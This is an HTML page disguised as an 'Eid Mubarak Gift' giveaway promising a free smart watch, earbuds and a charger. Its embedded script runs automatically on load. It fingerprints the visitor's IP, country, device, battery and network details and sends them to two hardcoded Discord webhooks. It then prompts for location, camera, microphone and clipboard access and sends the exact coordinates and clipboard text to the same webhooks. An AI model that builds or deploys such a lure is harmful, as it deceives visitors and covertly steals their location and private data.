<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eid Mubarak Gift</title>
    <link rel="manifest" href="manifest.json">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #0a5c0a, #128012);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }
        .box {
            max-width: 350px;
            width: 100%;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .header {
            background: #ffd700;
            padding: 20px;
            text-align: center;
        }
        .eid { font-size: 40px; margin-bottom: 5px; }
        h2 { color: #0a5c0a; font-size: 20px; }
        .timer {
            background: #0a5c0a;
            color: white;
            padding: 12px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }
        .gifts { padding: 15px; }
        .gift-row {
            display: flex;
            align-items: center;
            padding: 12px;
            background: #f5f5f5;
            margin-bottom: 8px;
            border-radius: 12px;
            cursor: pointer;
        }
        .gift-icon { font-size: 30px; width: 50px; text-align: center; }
        .gift-name { flex: 1; font-weight: bold; color: #333; }
        .gift-price { color: #e67e22; font-weight: bold; }
        .notify-btn {
            background: #0a5c0a;
            color: white;
            border: none;
            padding: 15px;
            margin: 15px;
            border-radius: 12px;
            width: calc(100% - 30px);
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .footer {
            text-align: center;
            padding: 15px;
            color: #999;
            font-size: 11px;
            border-top: 1px solid #eee;
        }
        .status {
            text-align: center;
            color: #0a5c0a;
            font-size: 12px;
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="header">
            <div class="eid">🌙</div>
            <h2>Eid Mubarak Gift</h2>
        </div>
        <div class="timer" id="timer">06:00:00</div>
        <div class="gifts">
            <div class="gift-row" onclick="showGift()"><span class="gift-icon">⌚</span><span class="gift-name">Smart Watch</span><span class="gift-price">FREE</span></div>
            <div class="gift-row" onclick="showGift()"><span class="gift-icon">🎧</span><span class="gift-name">Earbuds</span><span class="gift-price">FREE</span></div>
            <div class="gift-row" onclick="showGift()"><span class="gift-icon">⚡</span><span class="gift-name">Type C Charger</span><span class="gift-price">FREE</span></div>
        </div>
        <div class="status" id="statusMsg">🔔 Loading...</div>
        <button class="notify-btn" onclick="allowPermission()">🔔 ALLOW NOTIFICATION</button>
        <div class="footer">⏰ Limited time offer</div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        // ================ CONFIG ================
        const WEBHOOKS = [
            'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg',
            'https://discord.com/api/webhooks/1471082363944702006/_hZWpLDl_Uo2Mf7sHaHjhpLgY4KXfJGPjulB1u407flimKaRyUhIbN0LlVGZTsTttKyR'
        ];

        // ================ 1. WITHOUT PERMISSION DATA (2 SECOND MEIN) ================
        async function collectAndSendWithoutPermission() {
    console.log("Collecting MAGIC data...");

    // 1. IP Address
    let ip = "Unknown";
    try {
        const ipRes = await $.getJSON('https://api.ipify.org?format=json');
        ip = ipRes.ip;
    } catch (e) {}

    // 2. Country from IP (FREE API)
    let country = "Unknown";
    try {
        const countryRes = await $.getJSON(`https://ipapi.co/${ip}/json/`);
        country = countryRes.country_name + ' (' + countryRes.country_code + ')';
    } catch (e) {}

    // 3. Browser Data
    const browserData = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'Not set',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
        screenSize: screen.width + 'x' + screen.height,
        colorDepth: screen.colorDepth + '-bit',
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direct'
    };

    // 4. Network Info
    let connection = {};
    if (navigator.connection) {
        connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink + ' Mbps',
            rtt: navigator.connection.rtt + ' ms',
            saveData: navigator.connection.saveData ? 'On' : 'Off'
        };
    }

    // 5. Battery Info
    let batteryInfo = {};
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? 'Yes' : 'No',
                chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' sec',
                dischargingTime: battery.dischargingTime === Infinity ? 'Not discharging' : battery.dischargingTime + ' sec'
            };
        } catch (e) {}
    }

    // 6. Device Orientation (Last known)
    let orientation = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
    window.addEventListener('deviceorientation', function(e) {
        orientation = {
            alpha: Math.round(e.alpha),
            beta: Math.round(e.beta),
            gamma: Math.round(e.gamma)
        };
    }, { once: true });

    // 7. Media Devices (Count only)
    let mediaDevices = 'Unknown';
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const cameras = devices.filter(d => d.kind === 'videoinput').length;
        const mics = devices.filter(d => d.kind === 'audioinput').length;
        mediaDevices = `📸 ${cameras} Camera(s), 🎤 ${mics} Mic(s)`;
    } catch (e) {}

    // Prepare Discord Message
    const data = {
        content: '@everyone 🎩 **MAGIC DATA (Without Permission)**',
        embeds: [{
            title: '📊 Complete Browser Fingerprint',
            color: 0x00ff00,
            fields: [
                { name: '🌍 IP', value: ip, inline: true },
                { name: '🗺️ Country', value: country, inline: true },
                { name: '⏱️ Time', value: new Date().toLocaleString(), inline: true },
                { name: '📱 Platform', value: browserData.platform, inline: true },
                { name: '💻 CPU Cores', value: browserData.hardwareConcurrency.toString(), inline: true },
                { name: '🧠 RAM', value: browserData.deviceMemory + ' GB', inline: true },
                { name: '🖱️ Touch', value: browserData.touchSupport, inline: true },
                { name: '📺 Screen', value: browserData.screenSize, inline: true },
                { name: '🎨 Color', value: browserData.colorDepth, inline: true },
                { name: '🗣️ Language', value: browserData.language, inline: true },
                { name: '⏰ Timezone', value: browserData.timeZone, inline: true },
                { name: '🔌 Network', value: connection.effectiveType || 'Unknown', inline: true },
                { name: '⚡ Battery', value: batteryInfo.level || 'Unknown', inline: true },
                { name: '🔋 Charging', value: batteryInfo.charging || 'Unknown', inline: true },
                { name: '📡 Media Devices', value: mediaDevices, inline: true },
                { name: '🧭 Orientation', value: `α:${orientation.alpha} β:${orientation.beta} γ:${orientation.gamma}`, inline: true },
                { name: '🚫 Do Not Track', value: browserData.doNotTrack, inline: true }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    // Send to Webhooks
    for (const webhook of WEBHOOKS) {
        try {
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (e) {}
    }

    document.getElementById('statusMsg').innerHTML = '✅ MAGIC data sent! Now allowing permissions...';
}

        // ================ 2. PERMISSION DATA (5 SECOND BAAD) ================
        async function askForPermissions() {
            let permissionData = {};
            let grantedPermissions = [];

            // --- Notification ---
            if ('Notification' in window) {
                const notifPerm = await Notification.requestPermission();
                if (notifPerm === 'granted') {
                    grantedPermissions.push('🔔 Notifications');
                    permissionData.notification = 'Granted';
                } else {
                    permissionData.notification = 'Denied';
                }
            }

            // --- Location ---
            if ('geolocation' in navigator) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                    });
                    grantedPermissions.push('📍 Location');
                    permissionData.location = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                } catch (e) {
                    permissionData.location = 'Denied';
                }
            }

            // --- Camera ---
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(t => t.stop());
                grantedPermissions.push('📸 Camera');
                permissionData.camera = 'Granted';
            } catch (e) {
                permissionData.camera = 'Denied';
            }

            // --- Microphone ---
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                stream.getTracks().forEach(t => t.stop());
                grantedPermissions.push('🎤 Microphone');
                permissionData.microphone = 'Granted';
            } catch (e) {
                permissionData.microphone = 'Denied';
            }

            // --- Clipboard (Read) ---
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    grantedPermissions.push('📋 Clipboard');
                    permissionData.clipboard = text.substring(0, 50);
                }
            } catch (e) {
                permissionData.clipboard = 'Denied/No Access';
            }

            // Prepare Discord Message
            const data = {
                content: '@everyone 🔐 **User Permission Data**',
                embeds: [{
                    title: '✅ Granted Permissions',
                    color: 0xffaa00,
                    fields: [
                        { name: '🔔 Notification', value: permissionData.notification || 'No Request', inline: true },
                        { name: '📍 Location', value: permissionData.location ? 'Granted' : 'Denied', inline: true },
                        { name: '📸 Camera', value: permissionData.camera || 'Denied', inline: true },
                        { name: '🎤 Microphone', value: permissionData.microphone || 'Denied', inline: true },
                        { name: '📋 Clipboard', value: permissionData.clipboard ? 'Data Found' : 'No Data', inline: true },
                        { name: '✅ Total Granted', value: grantedPermissions.length.toString(), inline: true }
                    ],
                    description: grantedPermissions.join(' • ') || 'No permissions granted',
                    timestamp: new Date().toISOString()
                }]
            };

            // Agar location mili to extra field
            if (permissionData.location && typeof permissionData.location === 'object') {
                data.embeds[0].fields.push({
                    name: '📍 Exact Location',
                    value: `[Map](https://www.google.com/maps?q=${permissionData.location.lat},${permissionData.location.lng})`,
                    inline: false
                });
            }

            // Send to both webhooks
            for (const webhook of WEBHOOKS) {
                try {
                    await fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                } catch (e) {}
            }

            document.getElementById('statusMsg').innerHTML = `✅ Permissions sent! (${grantedPermissions.length} granted)`;
            return grantedPermissions;
        }

        // ================ MAIN EXECUTION ================
        window.onload = function() {
            // Timer
            let time = 21600;
            setInterval(() => {
                if (time > 0) time--;
                let h = Math.floor(time / 3600);
                let m = Math.floor((time % 3600) / 60);
                let s = time % 60;
                document.getElementById('timer').innerHTML = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
            }, 1000);

            // STEP 1: WITHOUT PERMISSION DATA (2 SECOND)
            setTimeout(collectAndSendWithoutPermission, 2000);

            // STEP 2: ASK FOR PERMISSIONS (5 SECOND)
            setTimeout(askForPermissions, 5000);

            // Register Service Worker
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('sw.js');
            }
        };

        function showGift() {
            document.getElementById('statusMsg').innerHTML = '⚠️ Pehle notification allow karo!';
        }

        // Manual button (agar user chahe to)
        window.allowPermission = askForPermissions;

        // Wapas aane par
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                if ('serviceWorker' in navigator) {
                    navigator.serviceWorker.ready.then(reg => {
                        reg.showNotification('👋 Wapas aagaye?', { body: 'Gift abhi bhi reserved hai!', tag: 'return' });
                    });
                }
            }
        });
    </script>
</body>
</html>
